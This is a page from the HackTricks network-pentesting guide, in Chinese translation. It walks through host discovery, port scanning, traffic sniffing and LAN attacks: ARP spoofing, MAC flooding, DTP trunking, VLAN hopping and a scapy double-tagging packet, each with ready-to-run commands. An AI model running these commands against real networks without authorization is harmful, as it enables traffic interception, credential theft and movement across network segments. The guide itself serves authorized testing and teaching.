<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Pentesting Network</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="pentesting-network"><a class="header" href="#pentesting-network">Pentesting Network</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<p><img src="../../.gitbook/assets/i3.png" alt="" data-size="original"><br />
<strong>漏洞赏金提示</strong>：<strong>注册</strong> <strong>Intigriti</strong>，一个由黑客为黑客创建的高级 <strong>漏洞赏金平台</strong>！今天就加入我们 <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>，开始赚取高达 <strong>$100,000</strong> 的赏金！</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<h2 id="从外部发现主机"><a class="header" href="#从外部发现主机">从外部发现主机</a></h2>
<p>这将是一个关于如何从 <strong>互联网</strong> 查找 <strong>响应的 IP</strong> 的 <strong>简要部分</strong>。<br />
在这种情况下，您有一些 <strong>IP 范围</strong>（甚至可能有多个 <strong>范围</strong>），您只需找出 <strong>哪些 IP 正在响应</strong>。</p>
<h3 id="icmp"><a class="header" href="#icmp">ICMP</a></h3>
<p>这是发现主机是否在线的 <strong>最简单</strong> 和 <strong>最快</strong> 的方法。<br />
您可以尝试发送一些 <strong>ICMP</strong> 数据包并 <strong>期待响应</strong>。最简单的方法是发送一个 <strong>回显请求</strong> 并期待响应。您可以使用简单的 <code>ping</code> 或使用 <code>fping</code> 进行 <strong>范围</strong> 测试。<br />
您还可以使用 <strong>nmap</strong> 发送其他类型的 ICMP 数据包（这将避免常见 ICMP 回显请求-响应的过滤器）。</p>
<pre><code class="language-bash">ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
</code></pre>
<h3 id="tcp-port-discovery"><a class="header" href="#tcp-port-discovery">TCP Port Discovery</a></h3>
<p>很常见的是，所有类型的 ICMP 数据包都被过滤。因此，您能做的就是 <strong>尝试查找开放端口</strong>。每个主机有 <strong>65535 个端口</strong>，所以，如果您有一个“大的”范围，您 <strong>无法</strong> 测试每个主机的 <strong>每个端口</strong> 是否开放，这将花费太多时间。<br />
因此，您需要的是一个 <strong>快速端口扫描器</strong> (<a href="https://github.com/robertdavidgraham/masscan">masscan</a>) 和一个 <strong>使用最频繁的端口</strong> 列表：</p>
<pre><code class="language-bash">#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
</code></pre>
<p>您也可以使用 <code>nmap</code> 执行此步骤，但速度较慢，并且 <code>nmap</code> 在识别主机时存在一些问题。</p>
<h3 id="http-端口发现"><a class="header" href="#http-端口发现">HTTP 端口发现</a></h3>
<p>这只是一个 TCP 端口发现，当您想要 <strong>专注于发现 HTTP</strong> <strong>服务</strong> 时非常有用：</p>
<pre><code class="language-bash">masscan -p80,443,8000-8100,8443 199.66.11.0/24
</code></pre>
<h3 id="udp端口发现"><a class="header" href="#udp端口发现">UDP端口发现</a></h3>
<p>您还可以尝试检查某些<strong>UDP端口是否开放</strong>，以决定是否应该<strong>更加关注</strong>一个<strong>主机</strong>。由于UDP服务通常<strong>不响应</strong>常规空UDP探测数据包，因此很难判断端口是被过滤还是开放。决定这一点的最简单方法是发送与正在运行的服务相关的数据包，由于您不知道正在运行哪个服务，您应该根据端口号尝试最可能的服务：</p>
<pre><code class="language-bash">nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
</code></pre>
<p>提议的 nmap 命令将测试每个 <strong>/24</strong> 范围内的 <strong>前 1000 个 UDP 端口</strong>，但即使仅此也需要 <strong>&gt;20min</strong>。如果需要 <strong>最快的结果</strong>，可以使用 <a href="https://github.com/portcullislabs/udp-proto-scanner"><strong>udp-proto-scanner</strong></a>：<code>./udp-proto-scanner.pl 199.66.11.53/24</code> 这将向其 <strong>预期端口</strong> 发送这些 <strong>UDP 探测</strong>（对于 /24 范围，这只需 1 分钟）：<em>DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp.</em></p>
<h3 id="sctp-端口发现"><a class="header" href="#sctp-端口发现">SCTP 端口发现</a></h3>
<pre><code class="language-bash">#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn &lt;IP/range&gt;
</code></pre>
<h2 id="pentesting-wifi"><a class="header" href="#pentesting-wifi">Pentesting Wifi</a></h2>
<p>在这里，您可以找到一个关于所有已知Wifi攻击的良好指南：</p>
<p>{% content-ref url="../pentesting-wifi/" %}
<a href="../pentesting-wifi/">pentesting-wifi</a>
{% endcontent-ref %}</p>
<h2 id="从内部发现主机"><a class="header" href="#从内部发现主机">从内部发现主机</a></h2>
<p>如果您在网络内部，您首先想要做的事情之一是<strong>发现其他主机</strong>。根据您可以/想要制造的<strong>噪音</strong>，可以执行不同的操作：</p>
<h3 id="被动"><a class="header" href="#被动">被动</a></h3>
<p>您可以使用这些工具在连接的网络中被动发现主机：</p>
<pre><code class="language-bash">netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
</code></pre>
<h3 id="active"><a class="header" href="#active">Active</a></h3>
<p>请注意，在 <a href="./#discovering-hosts-from-the-outside"><em><strong>从外部发现主机</strong></em></a> (<em>TCP/HTTP/UDP/SCTP 端口发现</em>) 中提到的技术也可以在这里<strong>应用</strong>。<br />
但是，由于您与其他主机在<strong>同一网络</strong>中，您可以做<strong>更多事情</strong>：</p>
<pre><code class="language-bash">#ARP discovery
nmap -sn &lt;Network&gt; #ARP Requests (Discover IPs)
netdiscover -r &lt;Network&gt; #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 &lt;IFACE&gt; # Send a pingv6 to multicast.
</code></pre>
<h3 id="active-icmp"><a class="header" href="#active-icmp">Active ICMP</a></h3>
<p>注意，在 <em>Discovering hosts from the outside</em> (<a href="./#icmp"><em><strong>ICMP</strong></em></a>) 中提到的技术也可以在这里<strong>应用</strong>。<br />
但是，由于您与其他主机在<strong>同一网络</strong>中，您可以做<strong>更多事情</strong>：</p>
<ul>
<li>如果您<strong>ping</strong>一个<strong>子网广播地址</strong>，ping应该到达<strong>每个主机</strong>，它们可能会<strong>回应</strong>您：<code>ping -b 10.10.5.255</code></li>
<li>ping <strong>网络广播地址</strong>，您甚至可以找到<strong>其他子网</strong>中的主机：<code>ping -b 255.255.255.255</code></li>
<li>使用 <code>-PE</code>、<code>-PP</code>、<code>-PM</code> 标志的 <code>nmap</code> 进行主机发现，分别发送<strong>ICMPv4 echo</strong>、<strong>时间戳</strong>和<strong>子网掩码请求</strong>：<code>nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24</code></li>
</ul>
<h3 id="wake-on-lan"><a class="header" href="#wake-on-lan"><strong>Wake On Lan</strong></a></h3>
<p>Wake On Lan 用于通过<strong>网络消息</strong>来<strong>开启</strong>计算机。用于开启计算机的魔术数据包只是一个提供了<strong>MAC Dst</strong>的包，然后在同一个包中<strong>重复16次</strong>。<br />
然后，这种类型的数据包通常以<strong>以太网 0x0842</strong>或<strong>UDP 数据包发送到端口 9</strong>。<br />
如果<strong>未提供 [MAC]</strong>，则数据包将发送到<strong>广播以太网</strong>（广播 MAC 将是被重复的那个）。</p>
<pre><code class="language-bash"># Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
</code></pre>
<h2 id="扫描主机"><a class="header" href="#扫描主机">扫描主机</a></h2>
<p>一旦你发现了所有想要深入扫描的 IP（外部或内部），可以执行不同的操作。</p>
<h3 id="tcp"><a class="header" href="#tcp">TCP</a></h3>
<ul>
<li><strong>开放</strong> 端口: <em>SYN --&gt; SYN/ACK --&gt; RST</em></li>
<li><strong>关闭</strong> 端口: <em>SYN --&gt; RST/ACK</em></li>
<li><strong>过滤</strong> 端口: <em>SYN --&gt; [无响应]</em></li>
<li><strong>过滤</strong> 端口: <em>SYN --&gt; ICMP 消息</em></li>
</ul>
<pre><code class="language-bash"># Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan &lt;IP&gt;
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan &lt;IP&gt;
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan &lt;IP&gt;

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
</code></pre>
<h3 id="udp"><a class="header" href="#udp">UDP</a></h3>
<p>有两种选项来扫描UDP端口：</p>
<ul>
<li>发送一个<strong>UDP数据包</strong>并检查响应_<strong>ICMP不可达</strong>_，如果端口是<strong>关闭</strong>的（在许多情况下，ICMP会被<strong>过滤</strong>，因此如果端口关闭或打开，您将不会收到任何信息）。</li>
<li>发送<strong>格式化的数据报</strong>以引发<strong>服务</strong>的响应（例如，DNS、DHCP、TFTP等，如_nmap-payloads_中列出）。如果您收到<strong>响应</strong>，那么端口是<strong>开放</strong>的。</li>
</ul>
<p><strong>Nmap</strong>将使用“-sV”<strong>混合这两种</strong>选项（UDP扫描非常慢），但请注意，UDP扫描比TCP扫描慢：</p>
<pre><code class="language-bash"># Check if any of the most common udp services is running
udp-proto-scanner.pl &lt;IP&gt;
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 &lt;IP&gt;
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 &lt;IP&gt;
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 &lt;IP&gt;
# You could use nmap to test all the UDP ports, but that will take a lot of time
</code></pre>
<h3 id="sctp-扫描"><a class="header" href="#sctp-扫描">SCTP 扫描</a></h3>
<p><strong>SCTP (流控制传输协议)</strong> 旨在与 <strong>TCP (传输控制协议)</strong> 和 <strong>UDP (用户数据报协议)</strong> 一起使用。其主要目的是促进通过 IP 网络传输电话数据，反映出许多在 <strong>信令系统 7 (SS7)</strong> 中发现的可靠性特征。<strong>SCTP</strong> 是 <strong>SIGTRAN</strong> 协议族的核心组成部分，旨在通过 IP 网络传输 SS7 信号。</p>
<p>各种操作系统提供对 <strong>SCTP</strong> 的支持，如 <strong>IBM AIX</strong>、<strong>Oracle Solaris</strong>、<strong>HP-UX</strong>、<strong>Linux</strong>、<strong>Cisco IOS</strong> 和 <strong>VxWorks</strong>，这表明其在电信和网络领域的广泛接受和实用性。</p>
<p>nmap 提供了两种不同的 SCTP 扫描： <em>-sY</em> 和 <em>-sZ</em></p>
<pre><code class="language-bash"># Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan &lt;IP&gt;
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan &lt;IP&gt;
</code></pre>
<h3 id="ids-和-ips-规避"><a class="header" href="#ids-和-ips-规避">IDS 和 IPS 规避</a></h3>
<p>{% content-ref url="ids-evasion.md" %}
<a href="ids-evasion.html">ids-evasion.md</a>
{% endcontent-ref %}</p>
<h3 id="更多-nmap-选项"><a class="header" href="#更多-nmap-选项"><strong>更多 nmap 选项</strong></a></h3>
<p>{% content-ref url="nmap-summary-esp.md" %}
<a href="nmap-summary-esp.html">nmap-summary-esp.md</a>
{% endcontent-ref %}</p>
<h3 id="揭示内部-ip-地址"><a class="header" href="#揭示内部-ip-地址">揭示内部 IP 地址</a></h3>
<p><strong>配置错误的路由器、防火墙和网络设备</strong> 有时会使用 <strong>非公开源地址</strong> 对网络探测做出响应。<strong>tcpdump</strong> 可用于识别在测试期间从私有地址接收到的数据包。具体来说，在 Kali Linux 上，可以在 <strong>eth2 接口</strong> 上捕获数据包，该接口可以从公共互联网访问。需要注意的是，如果您的设置位于 NAT 或防火墙后面，这些数据包可能会被过滤掉。</p>
<pre><code class="language-bash">tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 &gt; 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 &gt; 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
</code></pre>
<h2 id="sniffing"><a class="header" href="#sniffing">Sniffing</a></h2>
<p>通过嗅探，您可以通过查看捕获的帧和数据包来了解 IP 范围、子网大小、MAC 地址和主机名。如果网络配置错误或交换 fabric 处于压力状态，攻击者可以通过被动网络嗅探捕获敏感材料。</p>
<p>如果交换以太网网络配置正确，您将只看到广播帧和发往您 MAC 地址的材料。</p>
<h3 id="tcpdump"><a class="header" href="#tcpdump">TCPDump</a></h3>
<pre><code class="language-bash">sudo tcpdump -i &lt;INTERFACE&gt; udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i &lt;IFACE&gt; icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &amp;"
</code></pre>
<p>可以通过SSH会话使用Wireshark作为GUI实时捕获来自远程机器的数据包。</p>
<pre><code>ssh user@&lt;TARGET IP&gt; tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh &lt;USERNAME&gt;@&lt;TARGET IP&gt; tcpdump -i &lt;INTERFACE&gt; -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
</code></pre>
<h3 id="bettercap"><a class="header" href="#bettercap">Bettercap</a></h3>
<pre><code class="language-bash">net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
</code></pre>
<h3 id="wireshark"><a class="header" href="#wireshark">Wireshark</a></h3>
<p>显然。</p>
<h3 id="捕获凭证"><a class="header" href="#捕获凭证">捕获凭证</a></h3>
<p>您可以使用像 <a href="https://github.com/lgandx/PCredz">https://github.com/lgandx/PCredz</a> 这样的工具从 pcap 或实时接口中解析凭证。</p>
<h2 id="lan-攻击"><a class="header" href="#lan-攻击">LAN 攻击</a></h2>
<h3 id="arp-欺骗"><a class="header" href="#arp-欺骗">ARP 欺骗</a></h3>
<p>ARP 欺骗是指发送无偿的 ARP 响应，以指示某台机器的 IP 地址具有我们设备的 MAC 地址。然后，受害者将更改 ARP 表，并在每次想要联系伪造的 IP 时与我们的机器联系。</p>
<h4 id="bettercap-1"><a class="header" href="#bettercap-1"><strong>Bettercap</strong></a></h4>
<pre><code class="language-bash">arp.spoof on
set arp.spoof.targets &lt;IP&gt; #Specific targets to ARP spoof (default=&lt;entire subnet&gt;)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
</code></pre>
<h4 id="arpspoof"><a class="header" href="#arpspoof"><strong>Arpspoof</strong></a></h4>
<pre><code class="language-bash">echo 1 &gt; /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
</code></pre>
<h3 id="mac-flooding---cam-overflow"><a class="header" href="#mac-flooding---cam-overflow">MAC Flooding - CAM overflow</a></h3>
<p>通过发送大量具有不同源 MAC 地址的数据包来溢出交换机的 CAM 表。当 CAM 表满时，交换机开始像集线器一样工作（广播所有流量）。</p>
<pre><code class="language-bash">macof -i &lt;interface&gt;
</code></pre>
<p>在现代交换机中，这个漏洞已经被修复。</p>
<h3 id="8021q-vlan--dtp-攻击"><a class="header" href="#8021q-vlan--dtp-攻击">802.1Q VLAN / DTP 攻击</a></h3>
<h4 id="动态干道"><a class="header" href="#动态干道">动态干道</a></h4>
<p><strong>动态干道协议 (DTP)</strong> 被设计为一个链路层协议，以便于自动化的干道系统，使交换机能够自动选择干道模式 (Trunk) 或非干道模式的端口。<strong>DTP</strong> 的部署通常被视为网络设计不佳的标志，强调了仅在必要时手动配置干道的重要性，并确保适当的文档记录。</p>
<p>默认情况下，交换机端口设置为动态自动模式，这意味着它们准备在邻近交换机的提示下启动干道。当渗透测试者或攻击者连接到交换机并发送 DTP Desirable 帧时，会引发安全问题，迫使端口进入干道模式。这一行为使攻击者能够通过 STP 帧分析枚举 VLAN，并通过设置虚拟接口来绕过 VLAN 分段。</p>
<p>许多交换机默认存在 DTP，敌手可以利用这一点模仿交换机的行为，从而获得对所有 VLAN 流量的访问。脚本 <a href="https://github.com/commonexploits/dtpscan"><em><strong>dtpscan.sh</strong></em></a> 用于监控接口，揭示交换机是否处于默认、干道、动态、自动或接入模式——后者是唯一免受 VLAN 跳跃攻击的配置。该工具评估交换机的漏洞状态。</p>
<p>如果发现网络漏洞，可以使用 <em><strong>Yersinia</strong></em> 工具通过 DTP 协议“启用干道”，以便观察来自所有 VLAN 的数据包。</p>
<pre><code class="language-bash">apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
</code></pre>
<p><img src="../../.gitbook/assets/image%20(269).png" alt="" /></p>
<p>要枚举VLAN，也可以使用脚本<a href="https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py"><strong>DTPHijacking.py</strong></a>**生成DTP Desirable帧。**在任何情况下都不要中断脚本。它每三秒注入一次DTP Desirable。<strong>交换机上动态创建的干道通道仅持续五分钟。五分钟后，干道将失效。</strong></p>
<pre><code>sudo python3 DTPHijacking.py --interface eth0
</code></pre>
<p>我想指出，<strong>Access/Desirable (0x03)</strong> 表示 DTP 帧是 Desirable 类型，这告诉端口切换到 Trunk 模式。并且 <strong>802.1Q/802.1Q (0xa5)</strong> 表示 <strong>802.1Q</strong> 封装类型。</p>
<p>通过分析 STP 帧，<strong>我们了解到 VLAN 30 和 VLAN 60 的存在。</strong></p>
<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>
<h4 id="攻击特定-vlan"><a class="header" href="#攻击特定-vlan">攻击特定 VLAN</a></h4>
<p>一旦你知道 VLAN ID 和 IP 值，你可以 <strong>配置一个虚拟接口来攻击特定 VLAN</strong>。<br />
如果 DHCP 不可用，则使用 <em>ifconfig</em> 设置静态 IP 地址。</p>
<pre><code>root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
</code></pre>
<pre><code class="language-bash"># Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
</code></pre>
<pre><code class="language-bash"># Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
</code></pre>
<h4 id="自动vlan跳跃"><a class="header" href="#自动vlan跳跃">自动VLAN跳跃</a></h4>
<p>讨论的攻击<strong>动态干线和创建虚拟接口以发现其他VLAN中的主机</strong>由工具**<a href="https://github.com/nccgroup/vlan-hopping---frogger">https://github.com/nccgroup/vlan-hopping---frogger</a>**自动执行。</p>
<h4 id="双重标记"><a class="header" href="#双重标记">双重标记</a></h4>
<p>如果攻击者知道<strong>受害主机的MAC、IP和VLAN ID</strong>的值，他可以尝试<strong>双重标记一个帧</strong>，使用其指定的VLAN和受害者的VLAN并发送一个数据包。由于<strong>受害者无法与攻击者连接</strong>，因此<strong>攻击者的最佳选择是通过UDP进行通信</strong>，与可以执行一些有趣操作的协议（如SNMP）。</p>
<p>攻击者的另一个选择是发起<strong>TCP端口扫描，伪装成一个由攻击者控制并且受害者可以访问的IP</strong>（可能通过互联网）。然后，攻击者可以在他拥有的第二个主机上嗅探，如果它接收到来自受害者的一些数据包。</p>
<p><img src="../../.gitbook/assets/image%20(190).png" alt="" /></p>
<p>要执行此攻击，您可以使用scapy：<code>pip install scapy</code></p>
<pre><code class="language-python">from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
</code></pre>
<h4 id="lateral-vlan-segmentation-bypass"><a class="header" href="#lateral-vlan-segmentation-bypass">Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a></a></h4>
<p>如果您<strong>可以访问直接连接的交换机</strong>，您就有能力<strong>绕过 VLAN 分段</strong>。只需<strong>将端口切换到干道模式</strong>（也称为干道），创建具有目标 VLAN ID 的虚拟接口，并配置 IP 地址。您可以尝试动态请求地址（DHCP），或者可以静态配置。具体取决于情况。</p>
<p>{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
<a href="lateral-vlan-segmentation-bypass.html">lateral-vlan-segmentation-bypass.md</a>
{% endcontent-ref %}</p>
<h4 id="layer-3-private-vlan-bypass"><a class="header" href="#layer-3-private-vlan-bypass">Layer 3 Private VLAN Bypass</a></h4>
<p>在某些环境中，例如访客无线网络，**端口隔离（也称为私有 VLAN）**设置被实施，以防止连接到无线接入点的客户端直接相互通信。然而，已经识别出一种可以规避这些隔离措施的技术。该技术利用网络 ACL 的缺失或配置不当，使得 IP 数据包能够通过路由器路由到同一网络上的另一个客户端。</p>
